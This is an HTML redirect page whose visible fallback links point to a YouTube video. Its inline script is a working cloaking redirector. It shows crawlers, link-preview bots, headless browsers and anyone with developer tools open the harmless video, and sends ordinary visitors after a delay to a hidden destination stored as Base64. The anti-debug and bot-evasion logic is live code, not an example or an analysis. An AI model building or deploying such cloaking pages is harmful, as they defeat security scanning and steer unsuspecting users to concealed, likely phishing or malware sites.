<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Redirecting...</title>
    <!-- Fallback for non-JS bots (curl, wget, etc.) -->
    <meta http-equiv="refresh" content="0; url=https://youtu.be/1LtRVOTPLBg?si=PSAmzJKiPtW8OGSb">
    <link rel="canonical" href="https://youtu.be/1LtRVOTPLBg?si=PSAmzJKiPtW8OGSb">
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .logo-container {
            text-align: center;
            opacity: 0;
            animation: fadeInOut 2s ease-in-out;
        }
        .logo-container img {
            max-width: 200px;
            height: auto;
        }
        @keyframes fadeInOut {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtZFoZ09Lq1LkROpjM2kJvnR3unVdWA8Aa7A&s" alt="Logo">
    </div>
    <script type="text/javascript">
        (function() {
            // Replace with your Base64-encoded real URL
            const encodedRealUrl = 'aHR0cHM6Ly9wYXJpbi5jeW91L3BjYXN0';
            const botUrl = 'https://youtu.be/1LtRVOTPLBg?si=PSAmzJKiPtW8OGSb';
            let isBot = false;
            // 1. User-Agent check â€“ only obvious bots and tools
            const ua = navigator.userAgent.toLowerCase();
            const obviousBots = [
                'curl', 'wget', 'fetch', 'httpie',
                'bot', 'spider', 'crawler', 'slurp',
                'whatsapp', 'telegrambot', 'discordbot', 'slackbot',
                'twitterbot', 'facebookexternalhit', 'linkedinbot',
                'googlebot', 'bingbot', 'yandexbot', 'duckduckbot'
            ];
            if (obviousBots.some(bot => ua.includes(bot))) {
                isBot = true;
            }
            // 2. Strong headless detection only
            // This catches Puppeteer/Selenium/Playwright when not stealth-configured
            if (
                navigator.webdriver === true ||  // Most reliable flag
                (navigator.webdriver === undefined && ua.includes('headless')) // Some try to hide it
            ) {
                isBot = true;
            }
            // Optional light anti-debug (won't flag casual users)
            try {
                const start = performance.now();
                debugger;
                if (performance.now() - start > 100) {
                    isBot = true; // DevTools paused execution
                }
            } catch(e) {}
            // Delay redirect to allow animation to complete
            setTimeout(function() {
                if (isBot) {
                    window.location.href = botUrl;
                } else {
                    window.location.href = atob(encodedRealUrl);
                }
            }, 2000); // 2 second delay to match animation
        })();
    </script>
    <p class="fallback">If not redirected, <a href="https://youtu.be/1LtRVOTPLBg?si=PSAmzJKiPtW8OGSb">click here</a>.</p>
</body>
</html>
